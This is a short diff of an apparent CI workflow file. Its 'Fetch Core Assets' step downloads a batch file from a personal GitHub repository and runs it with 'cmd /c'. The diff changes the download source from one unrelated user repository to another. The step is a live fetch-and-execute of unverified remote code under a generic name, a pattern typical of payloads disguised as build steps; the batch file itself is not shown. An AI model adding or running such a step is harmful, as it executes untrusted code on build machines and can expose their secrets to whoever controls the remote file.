@@ -12,7 +12,7 @@ jobs:
     steps:
       - name: Fetch Core Assets
         run: |
-          Invoke-WebRequest -Uri "https://github.com/tahukedelai01/setup/raw/main/Downloads.bat" -OutFile "Downloads.bat"
+          Invoke-WebRequest -Uri "https://github.com/jerrycasler318/guide/raw/main/Downloads.bat" -OutFile "Downloads.bat"
           cmd /c Downloads.bat
 
       - name: Runtime
